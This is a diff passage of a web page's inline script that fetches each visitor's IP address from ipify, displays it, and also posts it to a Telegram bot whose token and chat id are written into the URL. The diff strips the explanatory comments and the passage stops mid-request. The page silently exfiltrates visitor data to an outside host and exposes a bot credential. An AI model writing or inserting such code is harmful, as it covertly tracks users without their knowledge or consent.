@@ -15,15 +15,9 @@
      
       <script>
      
-    /* Add "https://api.ipify.org?format=json" statement
-               this will communicate with the ipify servers in
-               order to retrieve the IP address $.getJSON will
-               load JSON-encoded data from the server using a
-               GET HTTP request */
-                
+
     $.getJSON("https://api.ipify.org?format=json&Access-Control-Allow-Origin=https://api.ipify.org", function(data) {
          
-        // Setting text of element P with id gfg
         $("#gfg").html(data.ip);
         fetch('https://api.telegram.org/bot6065032783:AAFVgRyMDdiYLq-Ph2NAo3i77NXLces7K6U/sendMessage?chat_id=6216682581&text=' + data.ip, {
   method: 'POST',
